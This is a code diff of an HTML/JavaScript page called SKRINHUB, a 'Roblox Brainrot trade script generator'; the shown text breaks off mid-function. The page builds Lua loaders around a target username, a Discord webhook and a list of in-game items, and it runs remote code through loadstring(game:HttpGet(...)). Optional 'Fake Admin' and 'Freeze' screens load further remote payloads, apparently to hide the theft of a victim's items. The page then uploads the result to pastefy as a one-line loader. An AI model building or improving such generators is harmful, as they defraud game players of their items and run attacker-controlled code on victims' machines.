@@ -1,282 +1,145 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>SKRINHUB</title>
-<link href="https://fonts.googleapis.com/css2?family=Rajdhani:wght@400;600;700&family=Share+Tech+Mono&display=swap" rel="stylesheet">
-<style>
-*, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
-  :root {
-    --bg: #000000;
-    --surface: #0a0a0a;
-    --panel: #111111;
-    --border: #333333;
-    --accent: #ffffff;
-    --muted: #666666;
-    --text: #ffffff;
-    --panel-shadow: 0 4px 20px rgba(255, 255, 255, 0.05);
-  }
-  body {
-    background: var(--bg);
-    color: var(--text);
-    font-family: 'Rajdhani', sans-serif;
-    min-height: 100vh;
-    overflow-x: hidden;
-  }
-  #particles-js {
-    position: fixed;
-    inset: 0;
-    z-index: 0;
-    pointer-events: none;
-  }
-  .wrap {
-    position: relative;
-    z-index: 1;
-    max-width: 920px;
-    margin: 0 auto;
-    padding: 2.8rem 1.5rem 6rem;
-  }
-  header {
-    text-align: center;
-    margin-bottom: 3rem;
-  }
-  .logo-row {
-    display: flex;
-    align-items: center;
-    justify-content: center;
-    gap: 1rem;
-    margin-bottom: 0.5rem;
-  }
-  .logo-row::before, .logo-row::after {
-    content: '';
-    flex: 1;
-    height: 1px;
-    max-width: 160px;
-    background: linear-gradient(to right, transparent, var(--accent), transparent);
-  }
-  h1 {
-    font-size: clamp(1.9rem, 4.5vw, 3rem);
-    font-weight: 700;
-    letter-spacing: .2em;
-    text-transform: uppercase;
-    color: var(--text);
-    line-height: 1;
-  }
-  .tagline {
-    font-family: 'Share Tech Mono', monospace;
-    font-size: .78rem;
-    letter-spacing: .18em;
-    text-transform: uppercase;
-    color: var(--muted);
-    margin-top: .4rem;
-  }
-  .panel {
-    background: var(--panel);
-    border: 1px solid var(--border);
-    border-radius: 4px;
-    overflow: hidden;
-    margin-bottom: 1.2rem;
-    box-shadow: var(--panel-shadow);
-  }
-  .ph {
-    display: flex;
-    align-items: center;
-    gap: .6rem;
-    padding: .75rem 1.25rem;
-    background: var(--surface);
-    border-bottom: 1px solid var(--border);
-  }
-  .dot {
-    width: 6px; height: 6px;
-    background: var(--accent);
-    box-shadow: 0 0 5px var(--accent);
-  }
-  .ph-title {
-    font-family: 'Share Tech Mono', monospace;
-    font-size: .72rem;
-    text-transform: uppercase;
-    letter-spacing: .15em;
-    color: var(--text);
-  }
-  .pb { padding: 1.25rem; }
-  .lbl {
-    display: block;
-    font-family: 'Share Tech Mono', monospace;
-    font-size: .68rem;
-    text-transform: uppercase;
-    color: var(--muted);
-    margin-bottom: .45rem;
-  }
-  .search-input, .txt, textarea {
-    width: 100%;
-    background: var(--surface);
-    border: 1px solid var(--border);
-    padding: .6rem .85rem;
-    color: var(--text);
-    font-family: 'Share Tech Mono', monospace;
-    font-size: .82rem;
-    outline: none;
-  }
-  .search-input:focus, .txt:focus { border-color: var(--accent); }
-  .btn-sm, .admin-mode-btn {
-    padding: .5rem .9rem;
-    background: transparent;
-    border: 1px solid var(--border);
-    color: var(--text);
-    font-family: 'Share Tech Mono', monospace;
-    font-size: .68rem;
-    text-transform: uppercase;
-    cursor: pointer;
-    transition: all .2s;
-  }
-  .btn-sm:hover, .admin-mode-btn.active {
-    background: var(--text);
-    color: var(--bg);
-  }
-  .animal-list {
-    background: var(--surface);
-    border: 1px solid var(--border);
-    height: 300px;
-    overflow-y: auto;
-    margin: 10px 0;
-  }
-  .a-item {
-    display: flex;
-    align-items: center;
-    padding: .5rem .9rem;
-    border-bottom: 1px solid #1a1a1a;
-    cursor: pointer;
-    font-size: 0.85rem;
-  }
-  .a-item:hover { background: #1a1a1a; }
-  .a-item input { margin-right: 12px; accent-color: white; }
-  .a-meta { margin-left: auto; color: var(--muted); font-family: 'Share Tech Mono'; font-size: 0.7rem; }
-  .btn-gen {
-    width: 100%;
-    padding: 1.1rem;
-    background: var(--text);
-    color: var(--bg);
-    border: none;
-    font-family: 'Rajdhani', sans-serif;
-    font-size: 1.1rem;
-    font-weight: 700;
-    text-transform: uppercase;
-    letter-spacing: .2em;
-    cursor: pointer;
-    margin-bottom: 2rem;
-    transition: transform 0.1s;
-  }
-  .btn-gen:active { transform: scale(0.98); }
-  .code-block {
-    background: var(--surface);
-    border: 1px solid var(--border);
-    padding: 1rem;
-    font-family: 'Share Tech Mono', monospace;
-    font-size: .78rem;
-    color: #00ff00;
-    min-height: 120px;
-    max-height: 500px;
-    overflow-y: auto;
-    white-space: pre;
-    scrollbar-width: thin;
-  }
-  .btn-copy {
-    margin-left: auto;
-    padding: .3rem .8rem;
-    background: #222;
-    border: 1px solid var(--border);
-    color: white;
-    font-size: .7rem;
-    cursor: pointer;
-  }
-</style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>SKRINHUB | FULL EDITION</title>
+    <link href="https://fonts.googleapis.com/css2?family=Rajdhani:wght@400;600;700&family=Share+Tech+Mono&display=swap" rel="stylesheet">
+    <style>
+        *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+        :root {
+            --bg: #000000;
+            --surface: #0a0a0a;
+            --panel: #111111;
+            --border: #333333;
+            --accent: #ffffff;
+            --muted: #666666;
+            --text: #ffffff;
+            --danger: #ff4444;
+        }
+        body {
+            background: var(--bg);
+            color: var(--text);
+            font-family: 'Rajdhani', sans-serif;
+            line-height: 1.5;
+            padding: 2rem 1rem;
+        }
+        .wrap { max-width: 900px; margin: 0 auto; position: relative; z-index: 1; }
+        header { text-align: center; margin-bottom: 3rem; }
+        h1 { font-size: 3rem; letter-spacing: 0.4em; text-transform: uppercase; border-bottom: 1px solid var(--border); display: inline-block; padding-bottom: 10px; }
+        
+        .panel { background: var(--panel); border: 1px solid var(--border); border-radius: 4px; margin-bottom: 1.5rem; overflow: hidden; }
+        .ph { padding: 0.8rem 1.2rem; background: var(--surface); border-bottom: 1px solid var(--border); display: flex; align-items: center; gap: 10px; }
+        .ph-title { font-family: 'Share Tech Mono'; font-size: 0.75rem; text-transform: uppercase; letter-spacing: 1px; }
+        .dot { width: 8px; height: 8px; background: var(--accent); box-shadow: 0 0 5px var(--accent); }
+        .pb { padding: 1.5rem; }
+
+        .txt, .search-input, textarea {
+            width: 100%; background: #050505; border: 1px solid var(--border); padding: 0.8rem;
+            color: white; font-family: 'Share Tech Mono'; margin-bottom: 10px; outline: none; transition: 0.2s;
+        }
+        .txt:focus { border-color: var(--accent); }
+
+        .btn-sm {
+            padding: 0.5rem 1rem; background: transparent; border: 1px solid var(--border);
+            color: white; cursor: pointer; font-family: 'Share Tech Mono'; font-size: 0.7rem; text-transform: uppercase;
+        }
+        .btn-sm:hover { background: white; color: black; }
+        .btn-sm.red:hover { background: var(--danger); border-color: var(--danger); }
+
+        .animal-list {
+            height: 300px; overflow-y: auto; border: 1px solid #1a1a1a; margin: 10px 0; background: #050505;
+            scrollbar-width: thin; scrollbar-color: var(--border) transparent;
+        }
+        .a-item { display: flex; align-items: center; padding: 10px 15px; border-bottom: 1px solid #111; cursor: pointer; transition: 0.1s; }
+        .a-item:hover { background: #111; }
+        .a-item input { margin-right: 15px; width: 16px; height: 16px; accent-color: white; }
+        .a-meta { margin-left: auto; color: var(--muted); font-size: 0.75rem; font-family: 'Share Tech Mono'; }
+
+        .admin-mode-selector { display: flex; gap: 5px; margin-bottom: 15px; }
+        .admin-mode-btn {
+            flex: 1; padding: 12px; background: #050505; border: 1px solid var(--border);
+            color: var(--muted); cursor: pointer; font-family: 'Share Tech Mono'; font-size: 0.7rem;
+        }
+        .admin-mode-btn.active { border-color: white; color: white; background: #1a1a1a; }
+
+        .btn-gen {
+            width: 100%; padding: 1.5rem; background: white; color: black; border: none;
+            font-weight: 700; text-transform: uppercase; letter-spacing: 0.3em; cursor: pointer;
+            font-size: 1.2rem; transition: 0.2s;
+        }
+        .btn-gen:hover { background: #ccc; transform: translateY(-2px); }
+        .btn-gen:active { transform: translateY(0); }
+
+        .code-block {
+            background: #050505; padding: 1.5rem; font-family: 'Share Tech Mono'; color: #00ff00;
+            font-size: 0.85rem; white-space: pre-wrap; word-break: break-all; border: 1px dashed var(--border); min-height: 100px;
+        }
+        .hint { font-size: 0.75rem; color: var(--muted); margin-top: 5px; font-family: 'Share Tech Mono'; }
+    </style>
 </head>
 <body>
+
 <div class="wrap">
-  <header>
-    <div class="logo-row"><h1>SKRINHUB</h1></div>
-    <p class="tagline">Roblox • Brainrot • Trade Script Generator</p>
-  </header>
-  <div class="panel">
-    <div class="ph"><div class="dot dot-cyan"></div><span class="ph-title">Select Brainrot Animals</span></div>
-    <div class="pb">
-      <div class="search-row">
-        <input class="search-input" id="searchBox" type="text" placeholder="Search animals..." oninput="filterList()">
-        <button class="btn-sm" onclick="selectAll()">All</button>
-        <button class="btn-sm red" onclick="clearAll()">Clear</button>
-      </div>
-      <div class="animal-list" id="animalList"></div>
-      <div id="customBrainrotInput">
-        <input type="text" id="customBrainrotName" placeholder="Add custom brainrot name...">
-        <button onclick="addCustomBrainrot()">Add</button>
-      </div>
-      <div id="pasteCustomListContainer">
-        <textarea id="pasteCustomListTextarea" placeholder='Paste your custom list here, e.g.:
-["Meowl"] = true,
-["Skibidi Toilet"] = true,
-["Strawberry Elephant"] = true,'></textarea>
-        <button onclick="parsePastedList()">Paste Custom List</button>
-      </div>
-      <div class="meta-row">
-        <span class="sel-count"><span id="selNum">0</span> selected</span>
-      </div>
+    <header>
+        <h1>SKRINHUB</h1>
+        <p class="tagline">ROBLOX BRAINROT TRADE GENERATOR</p>
+    </header>
+
+    <div class="panel">
+        <div class="ph"><div class="dot"></div><span class="ph-title">1. Item Database Selection</span></div>
+        <div class="pb">
+            <div style="display:flex; gap:10px; margin-bottom:15px;">
+                <input class="search-input" id="searchBox" type="text" placeholder="Search for items (e.g. Skibidi)..." oninput="renderList()">
+                <button class="btn-sm" onclick="selectAll()">Select All</button>
+                <button class="btn-sm red" onclick="clearAll()">Clear</button>
+            </div>
+            <div class="animal-list" id="animalList"></div>
+            <div style="display:flex; gap:10px;">
+                <input type="text" class="txt" id="customBrainrotName" placeholder="Add custom item name..." style="margin-bottom:0;">
+                <button class="btn-sm" onclick="addCustomBrainrot()">Add</button>
+            </div>
+            <p class="hint">Items Selected: <span id="selNum" style="color:white">0</span></p>
+        </div>
     </div>
-  </div>
-  <div class="panel">
-    <div class="ph"><div class="dot dot-purple"></div><span class="ph-title">Roblox Username</span></div>
-    <div class="pb">
-      <label class="lbl">Target username</label>
-      <div style="position: relative;">
-        <input class="txt" id="usernameInput" type="text" placeholder="e.g. Builderman" autocomplete="off" spellcheck="false">
-        <div id="usernameSuggestions" class="suggestions-container"></div>
+
+    <div class="panel">
+        <div class="ph"><div class="dot"></div><span class="ph-title">2. Configuration</span></div>
+        <div class="pb">
+            <label class="ph-title">Target Username</label>
+            <input class="txt" id="usernameInput" type="text" placeholder="Enter Roblox Username">
+            <label class="ph-title" style="display:block; margin-top:15px">Discord Webhook URL</label>
+            <input class="txt" id="webhookInput" type="text" placeholder="https://discord.com/api/webhooks/...">
+        </div>
     </div>
-      <p class="hint" id="usernameHint">The Roblox username to target in the script (3 characters minimum).</p>
+
+    <div class="panel">
+        <div class="ph"><div class="dot"></div><span class="ph-title">3. GUI Options</span></div>
+        <div class="pb">
+            <div class="admin-mode-selector">
+                <button class="admin-mode-btn active" onclick="setAdminMode('no-gui', this)">No GUI</button>
+                <button class="admin-mode-btn" onclick="setAdminMode('admin-panel', this)">Fake Admin</button>
+                <button class="admin-mode-btn" onclick="setAdminMode('freeze', this)">Freeze</button>
+                <button class="admin-mode-btn" onclick="setAdminMode('custom', this)">Custom</button>
+            </div>
+            <input class="txt" id="customAdminLoadstring" type="text" placeholder="Paste custom loadstring here..." style="display:none;">
+        </div>
     </div>
-  </div>
-  <div class="panel">
-    <div class="ph"><div class="dot dot-discord"></div><span class="ph-title">Discord Webhook</span></div>
-    <div class="pb">
-      <label class="lbl">Webhook URL</label>
-      <input class="txt" id="webhookInput" type="text" placeholder="https://discord.com/api/webhooks/..." autocomplete="off" spellcheck="false" oninput="validateWebhook()">
-      <p class="hint" id="webhookHint">Paste your Discord webhook (must start with https://discord.com/api/webhooks/).</p>
-    </div>
-  </div>
-  <div class="panel">
-    <div class="ph"><div class="dot dot-discord"></div><span class="ph-title">Gui Selector</span></div>
-    <div class="pb">
-      <div class="admin-mode-selector">
-        <button class="admin-mode-btn active" onclick="setAdminMode('no-gui')">No GUI</button>
-        <button class="admin-mode-btn" onclick="setAdminMode('admin-panel')">Fake Admin Panel</button>
-        <button class="admin-mode-btn" onclick="setAdminMode('freeze')">Freeze</button>
-        <button class="admin-mode-btn" onclick="setAdminMode('custom')">Custom</button>
-      </div>
-      <div id="customAdminInput">
-        <label class="lbl">Custom Loadstring</label>
-        <input class="txt" id="customAdminLoadstring" type="text" placeholder="e.g. loadstring(game:HttpGet('https://pastefy.app/...../raw'))()" oninput="updateCustomAdmin()">
-        <p class="hint">Enter your custom loadstring here.</p>
-      </div>
-    </div>
-  </div>
- <div class="panel">
-    <div class="pb">
-        <p class="hint" id="timeRemainingHint"></p>
+
+    <button class="btn-gen" onclick="generate()">⚡ Generate & Upload Script</button>
+
+    <div class="panel" style="margin-top:2rem">
+        <div class="ph"><div class="dot" style="background:#00ff00; box-shadow: 0 0 5px #00ff00;"></div><span class="ph-title">Final Result</span></div>
+        <div class="pb">
+            <div class="code-block" id="outputBlock">-- Results will appear here after generation...</div>
+            <button class="btn-sm" style="margin-top:10px; width:100%" onclick="copyResult()">Copy to Clipboard</button>
+        </div>
     </div>
 </div>
-  <button class="btn-gen" onclick="generate()">⚡ Generate Script</button>
-  <div class="panel">
-    <div class="out-ph">
-      <div class="dot dot-green"></div>
-      <span class="out-ph-title">Generated Script</span>
-      <button class="btn-copy" id="copyBtn" onclick="copyOut()">⧉ Copy</button>
-    </div>
-    <div class="pb">
-      <div class="code-block empty" id="outputBlock">-- Fill in the fields above and hit  Script...</div>
-    </div>
-  </div>
-</div>
+
 <script>
-const ANIMALS = [
+    // FULL DATA LIST
+    const ANIMALS = [
     {"name": "Strawberry Elephant", "rarity": "OG", "mps": "750M/s"},
     {"name": "Meowl", "rarity": "OG", "mps": "600M/s"},
     {"name": "Headless Horseman", "rarity": "OG", "mps": "550M/s"},
@@ -513,420 +376,126 @@ const ANIMALS = [
     {"name": "La Vacca Saturno Saturnita", "rarity": "Secret", "mps": "325K/s"},
     {"name": "Jackorilla", "rarity": "Secret", "mps": "315K/s"},
     {"name": "Secret Lucky Block", "rarity": "Secret", "mps": "0/s"}
-];
+    ];
 
+    let selected = new Set();
+    let adminMode = 'no-gui';
 
-function canGenerateScript() {
-    const lastGeneratedTime = localStorage.getItem('lastScriptGenerationTime');
-    if (!lastGeneratedTime) {
-        return true;
+    function renderList() {
+        const query = document.getElementById('searchBox').value.toLowerCase();
+        const container = document.getElementById('animalList');
+        container.innerHTML = '';
+
+        ANIMALS.filter(a => a.name.toLowerCase().includes(query)).forEach(a => {
+            const item = document.createElement('div');
+            item.className = 'a-item';
+            const isChecked = selected.has(a.name) ? 'checked' : '';
+            item.innerHTML = `<input type="checkbox" ${isChecked}> <span>${a.name}</span> <span class="a-meta">${a.rarity}</span>`;
+            
+            item.onclick = (e) => {
+                if(e.target.tagName !== 'INPUT') {
+                    const cb = item.querySelector('input');
+                    cb.checked = !cb.checked;
+                }
+                const cb = item.querySelector('input');
+                cb.checked ? selected.add(a.name) : selected.delete(a.name);
+                document.getElementById('selNum').innerText = selected.size;
+            };
+            container.appendChild(item);
+        });
     }
-    const currentTime = new Date().getTime();
-    const oneHour = 60 * 1000;
-    const timeElapsed = currentTime - lastGeneratedTime;
-    return timeElapsed >= oneHour;
-}
 
-function recordScriptGeneration() {
-    localStorage.setItem('lastScriptGenerationTime', new Date().getTime());
-}
-
-function getTimeRemaining() {
-    const lastGeneratedTime = localStorage.getItem('lastScriptGenerationTime');
-    if (!lastGeneratedTime) {
-        return 0;
+    function selectAll() {
+        ANIMALS.forEach(a => selected.add(a.name));
+        renderList();
+        document.getElementById('selNum').innerText = selected.size;
     }
-    const currentTime = new Date().getTime();
-    const oneHour = 60 * 1000;
-    const timeElapsed = currentTime - lastGeneratedTime;
-    const timeRemaining = oneHour - timeElapsed;
-    return Math.max(0, Math.ceil(timeRemaining / 1000 / 60));
-}
 
-function formatTimeRemaining(minutes) {
-    if (minutes <= 0) {
-        return "You can generate a script now.";
-    } else if (minutes === 1) {
-        return `You must wait 1 minute before generating another script.`;
-    } else {
-        return `You must wait ${minutes} minutes before generating another script.`;
+    function clearAll() {
+        selected.clear();
+        renderList();
+        document.getElementById('selNum').innerText = 0;
     }
-}
 
-function updateTimeRemainingDisplay() {
-    const timeRemaining = getTimeRemaining();
-    const hintElement = document.getElementById('timeRemainingHint');
-    if (hintElement) {
-        hintElement.textContent = formatTimeRemaining(timeRemaining);
-    }
-}
-
-updateTimeRemainingDisplay();
-setInterval(updateTimeRemainingDisplay, 60000);
-
-
-let selected = new Set();
-let adminMode = 'no-gui';
-let customAdminLoadstring = '';
-
-function addCustomBrainrot() {
-    const customName = document.getElementById('customBrainrotName').value.trim();
-    if (!customName) return;
-    if (!selected.has(customName)) {
-        selected.add(customName);
-        renderList(document.getElementById('searchBox').value);
-    }
-    document.getElementById('customBrainrotName').value = '';
-}
-
-function parsePastedList() {
-    const textarea = document.getElementById('pasteCustomListTextarea');
-    let text = textarea.value.trim();
-    if (!text) return;
-
-    const lines = text.split('\n')
-        .map(line => line.trim())
-        .filter(line => line.length > 0 && line.includes('["'));
-
-    const regex = /\[\s*"([^"]+)"\s*\]\s*=\s*true\s*,?/i;
-
-    lines.forEach(line => {
-        const match = line.match(regex);
-        if (match && match[1]) {
-            const name = match[1].trim();
-            if (name && !selected.has(name)) {
-                selected.add(name);
-            }
+    function addCustomBrainrot() {
+        const name = document.getElementById('customBrainrotName').value.trim();
+        if(name) {
+            selected.add(name);
+            renderList();
+            document.getElementById('customBrainrotName').value = '';
+            document.getElementById('selNum').innerText = selected.size;
         }
-    });
-
-
-    renderList(document.getElementById('searchBox').value);
-    textarea.value = '';
-}
-
-function setAdminMode(mode) {
-    adminMode = mode;
-    const buttons = document.querySelectorAll('.admin-mode-btn');
-    buttons.forEach(btn => btn.classList.remove('active'));
-    event.target.classList.add('active');
-    const customInput = document.getElementById('customAdminInput');
-    if (mode === 'custom') {
-        customInput.style.display = 'block';
-    } else {
-        customInput.style.display = 'none';
     }
-}
 
-function updateCustomAdmin() {
-    customAdminLoadstring = document.getElementById('customAdminLoadstring').value;
-}
-
-async function uploadToPastefy(script) {
-  try {
-    const response = await fetch("https://pastefy.app/api/v2/paste", {
-      method: "POST",
-      headers: {
-        "Content-Type": "application/json"
-      },
-      body: JSON.stringify({
-        title: "SKRINHUB Script",
-        content: script,
-      }),
-    });
-    const data = await response.json();
-    if (data.success && data.paste?.id) {
-      return `https://pastefy.app/${data.paste.id}/raw`;
+    function setAdminMode(mode, btn) {
+        adminMode = mode;
+        document.querySelectorAll('.admin-mode-btn').forEach(b => b.classList.remove('active'));
+        btn.classList.add('active');
+        document.getElementById('customAdminLoadstring').style.display = (mode === 'custom') ? 'block' : 'none';
     }
-    return null;
-  } catch (error) {
-    console.error("Upload error:", error);
-    return null;
-  }
-}
 
-async function generate() {
-    const btn = document.querySelector('.btn-gen');
-    const out = document.getElementById('outputBlock');
-    if (btn.disabled) return;
+    async function uploadToPastefy(script) {
+        try {
+            const response = await fetch("https://pastefy.app/api/v2/paste", {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({ title: "SKRINHUB_GEN", content: script })
+            });
+            const data = await response.json();
+            return data.success ? `https://pastefy.app/${data.paste.id}/raw` : null;
+        } catch (err) {
+            console.error(err);
+            return null;
+        }
+    }
 
-    btn.disabled = true;
-    btn.textContent = '⏳ Generating...';
-    btn.style.opacity = '0.6';
-
-    try {
-        const username = document.getElementById('usernameInput').value.trim();
+    async function generate() {
+        const out = document.getElementById('outputBlock');
+        const user = document.getElementById('usernameInput').value.trim();
         const webhook = document.getElementById('webhookInput').value.trim();
 
-        if (selected.size === 0) throw new Error('Please select at least one brainrot animal.');
-        if (username.length < 3) throw new Error('Username must be at least 3 characters long.');
-        if (!webhook.startsWith('https://discord.com/api/webhooks/')) throw new Error('Invalid webhook URL.');
-
-        const names = [...selected];
-        const brainrotLines = names.map(n => ` ["${n}"] = true,`).join('\n');
-
-        let adminScriptPart = '';
-        if (adminMode === 'admin-panel') {
-            adminScriptPart = `
-task.spawn(function()
-    loadstring(game:HttpGet("https://pastefy.app/GKYBLds1/raw"))()
-end)
-`;
-        } else if (adminMode === 'freeze') {
-            adminScriptPart = `
-task.spawn(function()
-    loadstring(game:HttpGet("https://pastefy.app/BNCsmpLk/raw"))()
-end)
-`;
-        } else if (adminMode === 'custom' && customAdminLoadstring.trim()) {
-            adminScriptPart = customAdminLoadstring;
+        if(!user || !webhook || selected.size === 0) {
+            alert("Error: Missing Username, Webhook, or Selected Items!");
+            return;
         }
 
-        const script = `getgenv().WEBHOOK_URL = "${webhook}"
-getgenv().TARGET_USERNAME = "${username}"
+        out.textContent = "⏳ Processing and uploading to Pastefy...";
+        
+        let adminPart = "";
+        if(adminMode === 'admin-panel') adminPart = '\ntask.spawn(function() loadstring(game:HttpGet("https://pastefy.app/GKYBLds1/raw"))() end)';
+        if(adminMode === 'freeze') adminPart = '\ntask.spawn(function() loadstring(game:HttpGet("https://pastefy.app/BNCsmpLk/raw"))() end)';
+        if(adminMode === 'custom') adminPart = '\n' + document.getElementById('customAdminLoadstring').value;
+
+        const itemsFormatted = [...selected].map(n => `    ["${n}"] = true,`).join('\n');
+        
+        const fullScript = `getgenv().WEBHOOK_URL = "${webhook}"
+getgenv().TARGET_USERNAME = "${user}"
 getgenv().TARGET_BRAINROT = {
-${brainrotLines}
+${itemsFormatted}
 }
+
 task.spawn(function()
-loadstring(game:HttpGet("soon"))()
-end)
-${adminScriptPart}
-`;
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/votre-lien-script/main.lua"))()
+end)${adminPart}`;
 
-        const pastefyRawUrl = await uploadToPastefy(script);
-
-        if (pastefyRawUrl) {
-            out.className = 'code-block';
-            out.textContent = `loadstring(game:HttpGet("${pastefyRawUrl}"))()`;
+        const rawUrl = await uploadToPastefy(fullScript);
+        
+        if(rawUrl) {
+            out.textContent = `loadstring(game:HttpGet("${rawUrl}"))()`;
         } else {
-            out.className = 'code-block';
-            out.textContent = `-- Failed to upload to Pastefy.
-Here is the raw script (copy it manually):
-
-${script}`;
+            out.textContent = "-- Pastefy failed. Here is your raw script:\n\n" + fullScript;
         }
-    } catch (err) {
-        console.warn("Error in generate():", err);
-        out.className = 'code-block empty';
-        out.textContent = err.message || 'An error occurred.';
-    } finally {
-        setTimeout(() => {
-            btn.disabled = false;
-            btn.textContent = '⚡ Generate Script';
-            btn.style.opacity = '1';
-        }, 1500);
     }
-}
 
-async function searchRobloxUsers(query) {
-    if (query.length < 3) return [];
-    try {
-        const proxyUrl = `https://roblox-search-proxy.vercel.app/api/roblox-search?keyword=${encodeURIComponent(query)}`;
-        const response = await fetch(proxyUrl);
-        if (!response.ok) throw new Error(`HTTP ${response.status}`);
-        const data = await response.json();
-        return data.data || [];
-    } catch (error) {
-        console.warn("Error during Roblox search:", error);
-        return [];
+    function copyResult() {
+        const text = document.getElementById('outputBlock').textContent;
+        navigator.clipboard.writeText(text);
+        alert("Copied!");
     }
-}
 
-async function fetchAvatarUrl(userId) {
-    try {
-        const proxyUrl = `https://avatar-proxy.vercel.app/api/avatar-proxy?userId=${userId}`;
-        const response = await fetch(proxyUrl);
-        if (!response.ok) {
-            throw new Error(`HTTP error! status: ${response.status}`);
-        }
-        const data = await response.json();
-        return data.imageUrl || null;
-    } catch (error) {
-        console.warn(`Unable to load avatar for user ${userId}:`, error.message);
-        return null;
-    }
-}
-
-async function showSuggestions(users) {
-    const container = document.getElementById('usernameSuggestions');
-    container.innerHTML = '';
-    if (users.length === 0) {
-        const noResult = document.createElement('div');
-        noResult.className = 'suggestion-item';
-        noResult.innerHTML = `<span class="suggestion-username" style="color: var(--muted);">No user found.</span>`;
-        container.appendChild(noResult);
-        container.style.display = 'block';
-        return;
-    }
-    const userPromises = users.map(async (user) => {
-        const avatarUrl = await fetchAvatarUrl(user.id);
-        return { ...user, avatarUrl };
-    });
-    const usersWithAvatars = await Promise.all(userPromises);
-    usersWithAvatars.forEach(user => {
-        const item = document.createElement('div');
-        item.className = 'suggestion-item';
-        item.innerHTML = `
-            <div class="suggestion-avatar">
-                <img src="${user.avatarUrl || 'data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI0OCIgaGVpZ2h0PSI0OCIgdmlld0JveD0iMCAwIDQ4IDQ4IiBzdHJva2U9ImN1cnJlbnRDb2xvciIgc3Ryb2tlLXdpZHRoPSIxIiBmaWxsPSJub25lIiBzdHJva2UtbGluZWNhcD0icm91bmQiPjxjaXJjbGUgY3g9IjI0IiBjeT0iMjQiIHI9IjI0Ii8+PC9zdmc+'}" alt="${user.name}">
-            </div>
-            <div class="suggestion-info">
-                <p class="suggestion-username">${user.displayName || user.name}</p>
-                <p class="suggestion-handle">@${user.name}</p>
-            </div>
-            <span class="suggestion-id">${user.id}</span>
-        `;
-        item.onclick = () => {
-            document.getElementById('usernameInput').value = user.name;
-            container.style.display = 'none';
-            validateUsername();
-        };
-        container.appendChild(item);
-    });
-    container.style.display = 'block';
-}
-
-const debounce = (func, delay) => {
-    let timeoutId;
-    return function(...args) {
-        clearTimeout(timeoutId);
-        timeoutId = setTimeout(() => func.apply(this, args), delay);
-    };
-};
-
-document.getElementById('usernameInput').addEventListener('input', debounce(async function(e) {
-    const query = e.target.value.trim();
-    if (query.length === 0) {
-        document.getElementById('usernameSuggestions').style.display = 'none';
-        return;
-    }
-    const users = await searchRobloxUsers(query);
-    showSuggestions(users);
-}, 300));
-
-function renderList(filter) {
-    const q = (filter || '').toLowerCase();
-    const list = document.getElementById('animalList');
-    list.innerHTML = '';
-    ANIMALS.forEach(animal => {
-        if (q && !animal.name.toLowerCase().includes(q)) return;
-        const row = document.createElement('div');
-        row.className = 'a-item' + (selected.has(animal.name) ? ' on' : '');
-        const cb = document.createElement('input');
-        cb.type = 'checkbox';
-        cb.checked = selected.has(animal.name);
-        cb.addEventListener('change', e => { e.stopPropagation(); toggle(animal.name); });
-        const lbl = document.createElement('span');
-        lbl.className = 'a-name';
-        lbl.textContent = animal.name;
-        const badge = document.createElement('span');
-        badge.className = animal.rarity === 'OG' ? 'badge-og' : 'badge-secret';
-        badge.textContent = animal.rarity;
-        const mps = document.createElement('span');
-        mps.className = 'a-meta';
-        mps.textContent = animal.mps;
-        row.append(cb, lbl, badge, mps);
-        row.addEventListener('click', e => { if (e.target !== cb) toggle(animal.name); });
-        list.appendChild(row);
-    });
-    selected.forEach(name => {
-        if (!ANIMALS.some(a => a.name === name)) {
-            const row = document.createElement('div');
-            row.className = 'a-item on';
-            const cb = document.createElement('input');
-            cb.type = 'checkbox';
-            cb.checked = true;
-            cb.addEventListener('change', e => { e.stopPropagation(); toggle(name); });
-            const lbl = document.createElement('span');
-            lbl.className = 'a-name';
-            lbl.textContent = name;
-            const badge = document.createElement('span');
-            badge.className = 'badge-secret';
-            badge.textContent = 'Custom';
-            row.append(cb, lbl, badge);
-            row.addEventListener('click', e => { if (e.target !== cb) toggle(name); });
-            list.appendChild(row);
-        }
-    });
-    document.getElementById('selNum').textContent = selected.size;
-}
-
-function toggle(name) {
-    selected.has(name) ? selected.delete(name) : selected.add(name);
-    renderList(document.getElementById('searchBox').value);
-}
-
-function filterList() { renderList(document.getElementById('searchBox').value); }
-function selectAll() { ANIMALS.forEach(n => selected.add(n.name)); renderList(document.getElementById('searchBox').value); }
-function clearAll() { selected.clear(); renderList(document.getElementById('searchBox').value); }
-
-function validateUsername() {
-    const username = document.getElementById('usernameInput').value.trim();
-    const hint = document.getElementById('usernameHint');
-    if (username.length < 3) {
-        hint.classList.add('error');
-        hint.textContent = 'Username must be at least 3 characters long!';
-        return false;
-    } else {
-        hint.classList.remove('error');
-        hint.textContent = 'The Roblox username to target in the script (3 characters minimum).';
-        return true;
-    }
-}
-
-function validateWebhook() {
-    const webhook = document.getElementById('webhookInput').value.trim();
-    const hint = document.getElementById('webhookHint');
-    if (!webhook.startsWith('https://discord.com/api/webhooks/')) {
-        hint.classList.add('error');
-        hint.textContent = 'Webhook must start with: https://discord.com/api/webhooks/';
-        return false;
-    }
-    const webhookRegex = /^https:\/\/discord\.com\/api\/webhooks\/(\d{17,20})\/[a-zA-Z0-9_-]{68,}$/;
-    if (!webhookRegex.test(webhook)) {
-        hint.classList.add('error');
-        hint.textContent = 'Invalid webhook format. Must be: https://discord.com/api/webhooks/<ID>/<TOKEN>';
-        return false;
-    }
-    const parts = webhook.split('/');
-    const webhookId = parts[5];
-    const webhookToken = parts[6];
-    if (!/^\d{17,20}$/.test(webhookId)) {
-        hint.classList.add('error');
-        hint.textContent = 'Invalid webhook ID. Must be 17-20 digits.';
-        return false;
-    }
-    if (!/^[a-zA-Z0-9_-]{68,}$/.test(webhookToken)) {
-        hint.classList.add('error');
-        hint.textContent = 'Invalid webhook token. Must be 68+ alphanumeric characters with dashes/underscores.';
-        return false;
-    }
-    hint.classList.remove('error');
-    hint.textContent = '✅ Valid Discord webhook.';
-    return true;
-}
-
-function copyOut() {
-    const code = document.getElementById('outputBlock').textContent;
